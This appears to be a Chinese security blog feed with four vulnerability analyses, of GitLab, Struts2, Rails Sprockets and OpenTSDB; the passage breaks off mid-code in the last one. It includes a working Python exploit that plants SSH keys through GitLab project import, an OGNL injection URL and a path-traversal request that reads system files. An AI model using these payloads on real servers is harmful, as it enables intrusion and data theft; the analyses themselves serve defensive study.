      <content type="text"><![CDATA[GitLab远程代码执行漏洞分析 -【CVE-2018-14364】 漏洞公告2018年7月17日，Gitlab官方发布安全更新版本，修复了一个远程命令执行漏洞，CVE ID为CVE-2018-14364，该漏洞由长亭研究人员发现，并在hackerone平台提交 影响版本：&gt;= 8.9.0修复版本：11.0.4, 10.8.6, and 10.7.7 漏洞分析以版本11.0.3为例。根据版本源码对比 从CHANGELOG.md中得知为Fix symlink vulnerability in project import 主要修改的代码文件为lib/gitlab/import_export/file_importer.rb 主要关注一下extracted_files。 当我们import一个项目时，会进入到file_import.rb。然后调用第17行的：1234567891011121314def import mkdir_p(@shared.export_path) remove_symlinks! wait_for_archived_file do decompress_archive endrescue =&gt; e @shared.error(e) falseensure remove_symlinks! end remove_symlinks用于删除导入文件中存在的符号链接。此前gitlab就因为符号链接的问题爆出过多个RCE问题，因此在这里做了检查：1234567def remove_symlinks! extracted_files.each do |path| FileUtils.rm(path) if File.lstat(path).symlink? end trueend 而extracted_files定义在61行，这个方法用于列出解压出来的所有文件。123def extracted_files Dir.glob("#&#123;@shared.export_path&#125;/**/*", File::FNM_DOTMATCH).reject &#123; |f| f =~ %r&#123;.*/\.&#123;1,2&#125;$&#125; &#125;end 在ruby中,关于正则表达式的符号定义如下： 也就是说%r{.*/\.{1,2}$}这个正则表达式最后的$只能匹配到一行的末尾（Matches end of line），而不是整个字符串的末尾（Matches end of string）。 根据POSIX 标准，对于文件名（filename）除了slash character/和null byte NULL外，其余字符均可以： 所以只要创建一个名字以\n开头的符号链接文件，就无法被extracted_files列出。 回到版本源码对比，在测试文件file_importer_spec.rb里： 因此构建测试环境：12345678910require "tmpdir"puts "The temp dir is: #&#123;Dir.tmpdir&#125;"export_path="#&#123;Dir.tmpdir&#125;/file_importer"evil_symlink_file="#&#123;export_path&#125;/.\nevil"valid_file="#&#123;export_path&#125;/valid.json"FileUtils.mkdir_p("#&#123;export_path&#125;/subfolder/")FileUtils.touch(valid_file)FileUtils.ln_s(valid_file, evil_symlink_file) 可以看到原本的正则表达式是无法检测到\nevil文件的： 利用过程提供一下压缩包生成脚本：123456789101112131415161718192021222324252627import osimport shutildef step_one(): os.chdir(uploads_dir) gitlab_dir = "/var/opt/gitlab" evil_symlink_name = ".\nevil" os.symlink(gitlab_dir, evil_symlink_name) os.chdir(exp_dir) os.system("tar -czf ../step1.tar.gz . &amp;&amp; rm -r uploads &amp;&amp; mkdir uploads")def step_two(): os.chdir(uploads_dir) evil_ssh_dir_name = ".\nevil/.ssh" os.makedirs(evil_ssh_dir_name) evil_dir = os.getcwd() + "/" + evil_ssh_dir_name os.chdir(evil_dir) shutil.copy(authorized_keys,"authorized_keys") os.chdir(exp_dir) os.system("tar -czf ../step2.tar.gz . &amp;&amp; rm -r uploads &amp;&amp; mkdir uploads")if __name__ == '__main__': uploads_dir = os.getcwd() + "/evil/uploads" exp_dir = os.getcwd() + "/evil" authorized_keys = os.getcwd() + "/key.pub" step_one() step_two() key.pub里保存公钥。其余文件见文末附件压缩包。 创建项目project ，选择Import project后选择Import an exported GitLab project 待导入成功后，如下图： 注意此时的项目名为test，同时右下角有一个Remove project，点击删除掉project，然而此时在gitlab的目录下，test还没有被删除。 新建一个project，仍然采用Import an exported GitLab project，然后上传第二个压缩包 第二个压缩包的内容如下，\nevil是目录名123456VERSIONproject.jsonuploads/uploads/.\nevil/uploads/.\nevil/.ssh/uploads/.\nevil/.ssh/authorized_keys gitlab在解压第二个压缩包时，会尝试往目录\nevil里写入.ssh/authorized_keys，而由于上一步的符号链接\nevil没有删除，所以实际写入的目录是/var/opt/gitlab/.ssh/authorized_keys 可以看到authorized_keys已经被写入了公钥。此后用用户名git和公钥对应的私钥直接ssh连接服务器即可。 Reference https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-14364]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[【Struts2-代码执行漏洞分析系列】S2-057]]></title>
      <url>%2F2018%2F09%2F10%2F%E3%80%90Struts2-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E3%80%91S2-057%2F</url>
      <content type="text"><![CDATA[【Struts2-代码执行漏洞分析系列】S2-057 漏洞公告https://cwiki.apache.org/confluence/display/WW/S2-057 问题：It is possible to perform a RCE attack when namespace value isn’t set for a result defined in underlying xml configurations and in same time, its upper action(s) configurations have no or wildcard namespace. Same possibility when using url tag which doesn’t have value and action set and in same time, its upper action(s) configurations have no or wildcard namespace. 漏洞发现者的博客： https://lgtm.com/blog/apache_struts_CVE-2018-11776 环境搭建下载 https://archive.apache.org/dist/struts/2.5.16/struts-2.5.16-all.zip IDEA中打开，修改apps/showcase/src/main/resources/struts-actionchaining.xml 为：12345678910111213&lt;!DOCTYPE struts PUBLIC "-//Apache Software Foundation//DTD Struts Configuration 2.5//EN" "http://struts.apache.org/dtds/struts-2.5.dtd"&gt;&lt;struts&gt; &lt;package name="actionchaining" extends="struts-default"&gt; &lt;action name="actionChain1" class="org.apache.struts2.showcase.actionchaining.ActionChain1"&gt; &lt;result type="redirectAction"&gt; &lt;param name = "actionName"&gt;register2&lt;/param&gt; &lt;/result&gt; &lt;/action&gt; &lt;/package&gt;&lt;/struts&gt; 同时查看 org/apache/struts2/default.properties:201 ，其值为true12### Whether to always select the namespace to be everything before the last slash or notstruts.mapper.alwaysSelectFullNamespace=true 访问: http://localhost:8081/${(111+111)}/actionChain1.action url变为： http://localhost:8081/222/register2.action 111+111=222 即产生了OGNL注入。 漏洞分析这次的漏洞可以有多种攻击向量，根据漏洞作者blog有: Redirect action Action chaining Postback result 以上提及的三种都属于Struts2的跳转方式。在 struts-default.xml:190(截取部分)12345&lt;result-types&gt; &lt;result-type name="chain" class="com.opensymphony.xwork2.ActionChainResult"/&gt; &lt;result-type name="redirectAction" class="org.apache.struts2.result.ServletActionRedirectResult"/&gt; &lt;result-type name="postback" class="org.apache.struts2.result.PostbackResult" /&gt;&lt;/result-types&gt; 为清楚起见，这里解释一下strut2中对默认result对象的处理过程。这些默认result type都要经过 com/opensymphony/xwork2/DefaultActionInvocation.java:367 处理1234567891011private void executeResult() throws Exception &#123; result = createResult(); String timerKey = "executeResult: " + getResultCode(); try &#123; UtilTimerStack.push(timerKey); if (result != null) &#123; result.execute(this); &#125; ...&#125; 首先通过result = createResult()获取到相应的result对象。如果result不为null则执行result.execute(this);。这个execute方法则由具体result对象实现。 有一些具体的result对象比如下面提到的Redirect action和Postback result，会产生一个跳转地址location，并传入org/apache/struts2/result/StrutsResultSupport.java:194:123456789101112/** * Implementation of the &lt;tt&gt;execute&lt;/tt&gt; method from the &lt;tt&gt;Result&lt;/tt&gt; interface. This will call * the abstract method &#123;@link #doExecute(String, ActionInvocation)&#125; after optionally evaluating the * location as an OGNL evaluation. * * @param invocation the execution state of the action. * @throws Exception if an error occurs while executing the result.*/public void execute(ActionInvocation invocation) throws Exception &#123; lastFinalLocation = conditionalParse(location, invocation); doExecute(lastFinalLocation, invocation);&#125; 而conditionalParse定义如下，将会执行OGNL表达式。1234567891011121314151617/** * Parses the parameter for OGNL expressions against the valuestack * * @param param The parameter value * @param invocation The action invocation instance * @return the resulting string*/protected String conditionalParse(String param, ActionInvocation invocation) &#123; if (parse &amp;&amp; param != null &amp;&amp; invocation != null) &#123; return TextParseUtil.translateVariables( param, invocation.getStack(), new EncodingParsedValueEvaluator()); &#125; else &#123; return param; &#125;&#125; 所以可以看到重点是StrutsResultSupport中conditionalParse(location, invocation)的location变量。 接下来部分就关注三种result-type的具体实现和具体攻击点。 攻击点一：Redirect actionapps/showcase/src/main/resources/struts-actionchaining.xml 中注意&lt;result&gt;标签中&lt;type&gt;为redirectAction：123&lt;result type="redirectAction"&gt; &lt;param name = "actionName"&gt;register2&lt;/param&gt;&lt;/result&gt; redirectAction对应的处理类为org.apache.struts2.result.ServletActionRedirectResult 在 com/opensymphony/xwork2/DefaultActionInvocation.java:368 跟入redirectAction的execute方法即 org/apache/struts2/result/ServletActionRedirectResult.java:160123456public void execute(ActionInvocation invocation) throws Exception &#123; actionName = conditionalParse(actionName, invocation); if (namespace == null) &#123; namespace = invocation.getProxy().getNamespace(); ...&#125; 由于在配置xml时没有指定naPmespace，所以这里的namespace为null，将会执行invocation.getProxy().getNamespace(); 所以执行后对于result对象的namespace即为/${(111+111)}。 同一函数中继续执行 172行123456789public void execute(ActionInvocation invocation) throws Exception &#123; ... String tmpLocation = actionMapper.getUriFromActionMapping(new ActionMapping(actionName, namespace, method, null)); setLocation(tmpLocation); super.execute(invocation);&#125; ActionMapping生成如下，this.namespace值赋为/${(111+111)}： 跟入getUriFromActionMapping:1234567891011public String getUriFromActionMapping(ActionMapping mapping) &#123; StringBuilder uri = new StringBuilder(); handleNamespace(mapping, uri); handleName(mapping, uri); handleDynamicMethod(mapping, uri); handleExtension(mapping, uri); handleParams(mapping, uri); return uri.toString();&#125; handleNamespace处理结果如下： 当函数返回，tmpLocation值为/${(111+111)}/register2.action，然后通过setLocation(tmpLocation)使得location变量值为/${(111+111)}/register2.action，从而最终造成OGNL注入。 攻击点二： Action chainingapps/showcase/src/main/resources/struts-actionchaining.xml 中注意&lt;result&gt;标签中&lt;type&gt;为chain：123&lt;result type="chain"&gt; &lt;param name = "actionName"&gt;register2&lt;/param&gt;&lt;/result&gt; 同样会先经过result = createResult()，然后调用result.execute(this);。这会进入到 com/opensymphony/xwork2/ActionChainResult.java:2031234567891011public void execute(ActionInvocation invocation) throws Exception &#123; // if the finalNamespace wasn't explicitly defined, assume the current one if (this.namespace == null) &#123; this.namespace = invocation.getProxy().getNamespace(); &#125; ValueStack stack = ActionContext.getContext().getValueStack(); String finalNamespace = TextParseUtil.translateVariables(namespace, stack); String finalActionName = TextParseUtil.translateVariables(actionName, stack); ...&#125; 由于没有设定namespace，所以通过invocation.getProxy().getNamespace()使得this.namespace值为/${(111+111)}。然后调用了String finalNamespace = TextParseUtil.translateVariables(namespace, stack);对namespace进行OGNL解析。如下 攻击点三：Postback resultapps/showcase/src/main/resources/struts-actionchaining.xml 中注意&lt;result&gt;标签中&lt;type&gt;为postback：123&lt;result type="postback"&gt; &lt;param name = "actionName"&gt;register2&lt;/param&gt;&lt;/result&gt; 经过result = createResult()，跟入定位到postback这个result对象的处理方法，在 org/apache/struts2/result/PostbackResult.java:113123456@Overridepublic void execute(ActionInvocation invocation) throws Exception &#123; String postbackUri = makePostbackUri(invocation); setLocation(postbackUri); super.execute(invocation);&#125; 跟入makePostbackUri1，在org/apache/struts2/result/PostbackResult.java:12912345678910111213141516171819protected String makePostbackUri(ActionInvocation invocation) &#123; ActionContext ctx = invocation.getInvocationContext(); HttpServletRequest request = (HttpServletRequest) ctx.get(ServletActionContext.HTTP_REQUEST); String postbackUri; if (actionName != null) &#123; actionName = conditionalParse(actionName, invocation); if (namespace == null) &#123; namespace = invocation.getProxy().getNamespace(); &#125; else &#123; namespace = conditionalParse(namespace, invocation); &#125; ... postbackUri = request.getContextPath() + actionMapper.getUriFromActionMapping(new ActionMapping(actionName, namespace, method, null)); &#125; ... return postbackUri;&#125; 获取到namespace值为/${(111+111)}。跟入actionMapper.getUriFromActionMapping(new ActionMapping(actionName, namespace, method, null))，其具体执行过程如攻击点一[Redirect action]提到的那样，设置namespace等参数，然后从getUriFromActionMapping中返回uri。最后组装的postbackUri为/${(111+111)}/register2.action 回到前面的execute中通过setLocation(postbackUri)设置了location变量： 此后location变量传入，造成OGNL表达式注入 参考 https://struts.apache.org/core-developers/namespace-configuration.html]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Ruby on Rails 路径穿越与任意文件读取漏洞分析 -【CVE-2018-3760】]]></title>
      <url>%2F2018%2F08%2F20%2FRuby-on-Rails-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E4%B8%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-3760%E3%80%91%2F</url>
      <content type="text"><![CDATA[Ruby on Rails 路径穿越与任意文件读取漏洞分析 -【CVE-2018-3760】 漏洞公告该漏洞由安全研究人员 Orange Tsai发现。漏洞公告来自 https://groups.google.com/forum/#!topic/rubyonrails-security/ft_J--l55fM1234567891011121314There is an information leak vulnerability in Sprockets. This vulnerabilityhas been assigned the CVE identifier CVE-2018-3760.Versions Affected: 4.0.0.beta7 and lower, 3.7.1 and lower, 2.12.4 and lower.Not affected: NONEFixed Versions: 4.0.0.beta8, 3.7.2, 2.12.5Impact------Specially crafted requests can be used to access files that exists onthe filesystem that is outside an application&apos;s root directory, when the Sprockets server isused in production.All users running an affected release should either upgrade or use one of the work arounds immediately. 影响面： development servers，且开启了 config.assets.compile 漏洞复现本地安装好ruby和rails。以ruby 2.4.4 ，rails v5.0.7为例：12$ gem install rails -v 5.0.7$ rails new blog &amp;&amp; cd blog 此时blog这个rails项目使用的sprockets版本是3.7.2（fixed）。修改blog目录下的Gemfile.lock第122行：1sprockets (3.7.1) 修改配置文件 config/environments/production.rb：1config.assets.compile = true 在blog目录下执行123456$ bundle install$ rails server * Min threads: 5, max threads: 5 * Environment: development * Listening on tcp://0.0.0.0:3000 Use Ctrl-C to stop payload:1GET /assets/file:%2f%2f//C:/chybeta/blog/app/assets/config/%252e%252e%2f%252e%2e%2f%252e%2e%2f%252e%2e%2f%252e%2e%2f%252e%2e%2f%252e%2e%2fWindows/win.ini win平台： linux平台 漏洞分析注：为明白起见，许多分析直接写在代码注释部分，请留意。 问题出在sprockets，它用来检查 JavaScript 文件的相互依赖关系，用以优化网页中引入的js文件，以避免加载不必要的js文件。当访问如http://127.0.0.1:3000/assets/foo.js时，会进入server.rb:12345678910111213141516171819202122232425262728def call(env) start_time = Time.now.to_f time_elapsed = lambda &#123; ((Time.now.to_f - start_time) * 1000).to_i &#125; if !['GET', 'HEAD'].include?(env['REQUEST_METHOD']) return method_not_allowed_response end msg = "Served asset #&#123;env['PATH_INFO']&#125; -" # Extract the path from everything after the leading slash path = Rack::Utils.unescape(env['PATH_INFO'].to_s.sub(/^\//, '')) # Strip fingerprint if fingerprint = path_fingerprint(path) path = path.sub("-#&#123;fingerprint&#125;", '') end # 此时path值为 file:///C:/chybeta/blog/app/assets/config/%2e%2e/%2e./%2e./%2e./%2e./%2e./%2e./Windows/win.ini # URLs containing a `".."` are rejected for security reasons. if forbidden_request?(path) return forbidden_response(env) end ... asset = find_asset(path, options) ... forbidden_request用来对path进行检查，是否包含..以防止路径穿越，是否是绝对路径：12345678private def forbidden_request?(path) # Prevent access to files elsewhere on the file system # # http://example.org/assets/../../../etc/passwd # path.include?("..") || absolute_path?(path)end 如果请求中包含..即返回真，然后返回forbidden_response(env)信息。 回到call函数，进入find_asset(path, options)，在 lib/ruby/gems/2.4.0/gems/sprockets-3.7.1/lib/sprockets/base.rb:63:12345678# Find asset by logical path or expanded path.def find_asset(path, options = &#123;&#125;) uri, _ = resolve(path, options.merge(compat: false)) if uri # 解析出来的 uri 值为 file:///C:/chybeta/blog/app/assets/config/%2e%2e/%2e./%2e./%2e./%2e./%2e./%2e./Windows/win.ini load(uri) endend 跟进load，在 lib/ruby/gems/2.4.0/gems/sprockets-3.7.1/lib/sprockets/loader.rb:32 。以请求GET /assets/file:%2f%2f//C:/chybeta/blog/app/assets/config/%252e%252e%2f%252e%2e%2f%252e%2e%2f%252e%2e%2f%252e%2e%2f%252e%2e%2f%252e%2e%2fWindows/win.ini为例，其一步步的解析过程见下注释：123456789101112131415161718192021222324252627282930313233def load(uri) # 此时 uri 已经经过了一次的url解码 # 其值为 file:///C:/chybeta/blog/app/assets/config/%2e%2e/%2e./%2e./%2e./%2e./%2e./%2e./Windows/win.ini unloaded = UnloadedAsset.new(uri, self) if unloaded.params.key?(:id) ... else asset = fetch_asset_from_dependency_cache(unloaded) do |paths| # When asset is previously generated, its "dependencies" are stored in the cache. # The presence of `paths` indicates dependencies were stored. # We can check to see if the dependencies have not changed by "resolving" them and # generating a digest key from the resolved entries. If this digest key has not # changed the asset will be pulled from cache. # # If this `paths` is present but the cache returns nothing then `fetch_asset_from_dependency_cache` # will confusingly be called again with `paths` set to nil where the asset will be # loaded from disk. # 当存在缓存时 if paths load_from_unloaded(unloaded) digest = DigestUtils.digest(resolve_dependencies(paths)) if uri_from_cache = cache.get(unloaded.digest_key(digest), true) asset_from_cache(UnloadedAsset.new(uri_from_cache, self).asset_key) end else # 当缓存不存在，主要考虑这个 load_from_unloaded(unloaded) end end end Asset.new(self, asset)end 跟入UnloadedAsset.new123456789101112131415161718192021222324252627282930313233343536373839class UnloadedAsset def initialize(uri, env) @uri = uri.to_s @env = env @compressed_path = URITar.new(uri, env).compressed_path @params = nil # lazy loaded @filename = nil # lazy loaded 具体实现见下面 end ... # Internal: Full file path without schema # # This returns a string containing the full path to the asset without the schema. # Information is loaded lazilly since we want `UnloadedAsset.new(dep, self).relative_path` # to be fast. Calling this method the first time allocates an array and a hash. # # Example # # If the URI is `file:///Full/path/app/assets/javascripts/application.js"` then the # filename would be `"/Full/path/app/assets/javascripts/application.js"` # # Returns a String. # 由于采用了Lazy loaded，当第一次访问到filename这个属性时，会调用下面这个方法 def filename unless @filename load_file_params # 跟进去，见下 end @filename end ... # 第 130 行 private # Internal: Parses uri into filename and params hash # # Returns Array with filename and params hash def load_file_params # uri 为 file:///C:/chybeta/blog/app/assets/config/%2e%2e/%2e./%2e./%2e./%2e./%2e./%2e./Windows/win.ini @filename, @params = URIUtils.parse_asset_uri(uri) end 跟入URIUtils.parse_asset_uri123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051def parse_asset_uri(uri) # uri 为 file:///C:/chybeta/blog/app/assets/config/%2e%2e/%2e./%2e./%2e./%2e./%2e./%2e./Windows/win.ini # 跟进 split_file_uri scheme, _, path, query = split_file_uri(uri) ... return path, parse_uri_query_params(query)end...# 省略def split_file_uri(uri) scheme, _, host, _, _, path, _, query, _ = URI.split(uri) # 此时解析出的几个变量如下： # scheme: file # host: # path: /C:/chybeta/blog/app/assets/config/%2e%2e/%2e./%2e./%2e./%2e./%2e./%2e./Windows/win.ini # query: path = URI::Generic::DEFAULT_PARSER.unescape(path) # 这里经过第二次的url解码 # path：/C:/chybeta/blog/app/assets/config/../../../../../../../Windows/win.ini path.force_encoding(Encoding::UTF_8) # Hack for parsing Windows "file:///C:/Users/IEUser" paths path.gsub!(/^\/([a-zA-Z]:)/, '\1'.freeze) # path: C:/chybeta/blog/app/assets/config/../../../../../../../Windows/win.ini [scheme, host, path, query]end``` ![5.png](https://xzfile.aliyuncs.com/media/upload/picture/20180808122707-4f8e0bce-9ac3-1.png)在完成了filename解析后，我们回到`load`函数末尾，进入`load_from_unloaded(unloaded)`:```ruby # Internal: Loads an asset and saves it to cache # # unloaded - An UnloadedAsset # # This method is only called when the given unloaded asset could not be # successfully pulled from cache. def load_from_unloaded(unloaded) unless file?(unloaded.filename) raise FileNotFound, "could not find file: #&#123;unloaded.filename&#125;" end load_path, logical_path = paths_split(config[:paths], unloaded.filename) unless load_path raise FileOutsidePaths, "#&#123;unloaded.filename&#125; is no longer under a load path: #&#123;self.paths.join(', ')&#125;" end .... 主要是进行了两个检查：文件是否存在和是否在合规目录里。主要关注第二个检测。其中config[:paths]是允许的路径，而unloaded.filename是请求的路径文件名。跟入 lib/ruby/gems/2.4.0/gems/sprockets-3.7.2/lib/sprockets/path_utils.rb:120：1234567891011121314151617# Internal: Detect root path and base for file in a set of paths.## paths - Array of String paths# filename - String path of file expected to be in one of the paths.## Returns [String root, String path]def paths_split(paths, filename) # 对paths中的每一个 path paths.each do |path| # 如果subpath不为空 if subpath = split_subpath(path, filename) # 则返回 path, subpath return path, subpath end end nilend 继续跟入split_subpath， lib/ruby/gems/2.4.0/gems/sprockets-3.7.2/lib/sprockets/path_utils.rb:103。假设上面传入的path参数是``。1234567891011121314151617181920# Internal: Get relative path for root path and subpath. # # path - String path # subpath - String subpath of path # # Returns relative String path if subpath is a subpath of path, or nil if # subpath is outside of path. def split_subpath(path, subpath) return "" if path == subpath # 此时 path 为 C:/chybeta/blog/app/assets/config/../../../../../../../Windows/win.ini path = File.join(path, '') # 此时 path 为 C:/chybeta/blog/app/assets/config/../../../../../../../Windows/win.ini/ # 与传入的绝对路径进行比较 # 如果以 允许的路径 为开头，则检查通过。 if subpath.start_with?(path) subpath[path.length..-1] else nil end end 通过检查后，在load_from_unloaded末尾即进行了读取等操作，从而通过路径穿越造成任意文件读取。 如果文件以.erb结尾，则会直接执行： 补丁 在server.rb中，增加关键字过滤://。 Reference https://github.com/rails/sprockets/commit/c09131cf5b2c479263939c8582e22b98ed616c5f https://blog.heroku.com/rails-asset-pipeline-vulnerability https://twitter.com/orange_8361/status/1009309271698300928]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[OpenTSDB远程命令执行漏洞分析 -【CVE-2018-12972】]]></title>
      <url>%2F2018%2F08%2F11%2FOpenTSDB%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-12972%E3%80%91%2F</url>
      <content type="text"><![CDATA[OpenTSDB远程命令执行漏洞分析 -【CVE-2018-12972】 相关背景 Opentsdb是基于Hbase的分布式的，可伸缩的时间序列数据库。官方提供了一个web界面来提供对查询数据进行可视化分析，其背后的绘图由Gnuplot支持。其Github地址为： https://github.com/OpenTSDB/opentsdb 。在某些版本(比如2.3.0，以下分析以2.3.0版本为例)中，其提供的Web接口存在远程命令执行漏洞，一旦利用成功将以root权限执行。分析见下。 漏洞分析在opentsdb中，默认情况下tsd.core.enable_ui开启，允许通过http来进行rpc调用。当访问时/q?xx=xxx时，对应的rpc接口即GraphHandler。见 src/tsd/RpcManager.java:297：12345678910private void initializeBuiltinRpcs(final String mode, final ImmutableMap.Builder&lt;String, TelnetRpc&gt; telnet, final ImmutableMap.Builder&lt;String, HttpRpc&gt; http) &#123; ... if (enableUi) &#123; ... http.put("q", new GraphHandler()); ... &#125; ... 在 src/tsd/GraphHandler.java:108 execute中12345678910public void execute(final TSDB tsdb, final HttpQuery query) &#123; ... try &#123; doGraph(tsdb, query); &#125; catch (IOException e) &#123; query.internalError(e); &#125; catch (IllegalArgumentException e) &#123; query.badRequest(e.getMessage()); &#125; &#125; 跟入 doGraph其中接受参数在src/tsd/GraphHandler.java:198 doGraph 中：123456789101112131415161718192021222324252627282930313233343536373839404142private void doGraph(final TSDB tsdb, final HttpQuery query) throws IOException &#123; final String basepath = getGnuplotBasePath(tsdb, query); // 获取 start 参数,保证格式正确，否则抛出错误 long start_time = DateTime.parseDateTimeString( query.getRequiredQueryStringParam("start"), query.getQueryStringParam("tz")); ... // 获取 end 参数,保证格式正确，否则抛出错误 long end_time = DateTime.parseDateTimeString( query.getQueryStringParam("end"), query.getQueryStringParam("tz")); ... // 获取 o 参数 List&lt;String&gt; options = query.getQueryStringParams("o"); ... final Plot plot = new Plot(start_time, end_time, DateTime.timezones.get(query.getQueryStringParam("tz"))); // 设置 plot 维度，无影响，可忽略 setPlotDimensions(query, plot); // 设置 plot 参数, 下文讲解 setPlotParams(query, plot); ... final RunGnuplot rungnuplot = new RunGnuplot(query, max_age, plot, basepath, aggregated_tags, npoints); ... // Fetch global annotations, if needed if (...) &#123; ... &#125; else &#123; // 执行画图程序 execGnuplot(rungnuplot, query); &#125;&#125; 从请求中获取对应值并设置plot参数在setPlotParams(query, plot);中完成：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556static void setPlotParams(final HttpQuery query, final Plot plot) &#123; final HashMap&lt;String, String&gt; params = new HashMap&lt;String, String&gt;(); final Map&lt;String, List&lt;String&gt;&gt; querystring = query.getQueryString(); String value; if ((value = popParam(querystring, "yrange")) != null) &#123; params.put("yrange", value); &#125; if ((value = popParam(querystring, "y2range")) != null) &#123; params.put("y2range", value); &#125; if ((value = popParam(querystring, "ylabel")) != null) &#123; params.put("ylabel", stringify(value)); &#125; if ((value = popParam(querystring, "y2label")) != null) &#123; params.put("y2label", stringify(value)); &#125; if ((value = popParam(querystring, "yformat")) != null) &#123; params.put("format y", stringify(value)); &#125; if ((value = popParam(querystring, "y2format")) != null) &#123; params.put("format y2", stringify(value)); &#125; if ((value = popParam(querystring, "xformat")) != null) &#123; params.put("format x", stringify(value)); &#125; if ((value = popParam(querystring, "ylog")) != null) &#123; params.put("logscale y", ""); &#125; if ((value = popParam(querystring, "y2log")) != null) &#123; params.put("logscale y2", ""); &#125; if ((value = popParam(querystring, "key")) != null) &#123; params.put("key", value); &#125; if ((value = popParam(querystring, "title")) != null) &#123; params.put("title", stringify(value)); &#125; if ((value = popParam(querystring, "bgcolor")) != null) &#123; params.put("bgcolor", value); &#125; if ((value = popParam(querystring, "fgcolor")) != null) &#123; params.put("fgcolor", value); &#125; if ((value = popParam(querystring, "smooth")) != null) &#123; params.put("smooth", value); &#125; if ((value = popParam(querystring, "style")) != null) &#123; params.put("style", value); &#125; // This must remain after the previous `if' in order to properly override // any previous `key' parameter if a `nokey' parameter is given. if ((value = popParam(querystring, "nokey")) != null) &#123; params.put("key", null); &#125; plot.setParams(params);&#125; 为方便起见，整理一下http请求参数、java代码、plot参数的对应关系。有一些参数经过了stringify，用于后续的JSON格式的转换。经过stringify的参数都会被双引号包含（见下面的代码），难以后续逃逸使用。还有一些参数直接被设定为空值。这些参数对应如下： http请求参数 Java代码 plot参数 ylabel put(“ylabel”, stringify(value)) ylabel y2label put(“y2label”, stringify(value)) y2label yformat put(“format y”, stringify(value)) format y y2format put(“format y2”, stringify(value)) format y2 xformat put(“format x”, stringify(value)) format x ylog put(“logscale y”, “”) logscale y y2log put(“logscale y2”, “”) logscale y2 title put(“title”, stringify(value)) title stringify定义在 src/tsd/GraphHandler.java:658 ：1234567private static String stringify(final String s) &#123; final StringBuilder buf = new StringBuilder(1 + s.length() + 1); buf.append('"'); HttpQuery.escapeJson(s, buf); // Abusing this function gets the job done. buf.append('"'); return buf.toString();&#125; escapeJson定义在 src/tsd/HttpQuery.java:471 中，主要对一些特殊字符进行转义：12345678910111213141516171819202122232425262728293031323334353637383940414243444546static void escapeJson(final String s, final StringBuilder buf) &#123; final int length = s.length(); int extra = 0; // First count how many extra chars we'll need, if any. for (int i = 0; i &lt; length; i++) &#123; final char c = s.charAt(i); switch (c) &#123; case '"': case '\\': case '\b': case '\f': case '\n': case '\r': case '\t': extra++; continue; &#125; if (c &lt; 0x001F) &#123; extra += 4; &#125; &#125; if (extra == 0) &#123; buf.append(s); // Nothing to escape. return; &#125; buf.ensureCapacity(buf.length() + length + extra); for (int i = 0; i &lt; length; i++) &#123; final char c = s.charAt(i); switch (c) &#123; case '"': buf.append('\\').append('"'); continue; case '\\': buf.append('\\').append('\\'); continue; case '\b': buf.append('\\').append('b'); continue; case '\f': buf.append('\\').append('f'); continue; case '\n': buf.append('\\').append('n'); continue; case '\r': buf.append('\\').append('r'); continue; case '\t': buf.append('\\').append('t'); continue; &#125; if (c &lt; 0x001F) &#123; buf.append('\\').append('u').append('0').append('0') .append((char) Const.HEX[(c &gt;&gt;&gt; 4) &amp; 0x0F]) .append((char) Const.HEX[c &amp; 0x0F]); &#125; else &#123; buf.append(c); &#125; &#125;&#125; 还有一些参数并没有经过转义等，如下表 http请求参数 Java代码 plot参数 yrange put(“yrange”, value) yrange y2range put(“y2range”, value) y2range key put(“key”, value) key bgcolor put(“bgcolor”, value) bgcolor fgcolor put(“fgcolor”, value) fgcolor smooth put(“smooth”, value) smooth style put(“style”, value) style 在完成参数设置后，创建了一个RunGnuplot对象，其中前面解析到的参数即对应的写入到了plot属性中 123456789101112131415161718192021222324private static final class RunGnuplot implements Runnable &#123; private final HttpQuery query; private final int max_age; private final Plot plot; private final String basepath; private final HashSet&lt;String&gt;[] aggregated_tags; private final int npoints; public RunGnuplot(final HttpQuery query, final int max_age, final Plot plot, final String basepath, final HashSet&lt;String&gt;[] aggregated_tags, final int npoints) &#123; ... this.plot = plot; if (IS_WINDOWS) this.basepath = basepath.replace("\\", "\\\\").replace("/", "\\\\"); else this.basepath = basepath; ... &#125; 在doGraph的最后执行了execGnuplot(rungnuplot, query);，即src/tsd/GraphHandler.java:25612345678private void execGnuplot(RunGnuplot rungnuplot, HttpQuery query) &#123; try &#123; gnuplot.execute(rungnuplot); &#125; catch (RejectedExecutionException e) &#123; query.internalError(new Exception("Too many requests pending," + " please try again later", e)); &#125;&#125; 这边RunGnuplot实现了Runnable接口，因此当线程开始执行时调用的是RunGnuplot的run方法：123456789101112131415private static final class RunGnuplot implements Runnable &#123; ... public void run() &#123; try &#123; execute(); &#125; catch (BadRequestException e) &#123; query.badRequest(e.getMessage()); &#125; catch (GnuplotException e) &#123; query.badRequest("&lt;pre&gt;" + e.getMessage() + "&lt;/pre&gt;"); &#125; catch (RuntimeException e) &#123; query.internalError(e); &#125; catch (IOException e) &#123; query.internalError(e); &#125; &#125; 跟入execute():1234 private void execute() throws IOException &#123; final int nplotted = runGnuplot(query, basepath, plot); ...&#125; 跟入runGnuplot，位置在src/tsd/GraphHandler.java:75812345678910111213static int runGnuplot(final HttpQuery query, final String basepath, final Plot plot) throws IOException &#123; final int nplotted = plot.dumpToFiles(basepath); ... final Process gnuplot = new ProcessBuilder(GNUPLOT, basepath + ".out", basepath + ".err", basepath + ".gnuplot").start(); ... return nplotted; &#125; dumpToFiles方法定义在src/graph/Plot.java:196:1234567891011121314151617public int dumpToFiles(final String basepath) throws IOException &#123; int npoints = 0; final int nseries = datapoints.size(); final String datafiles[] = 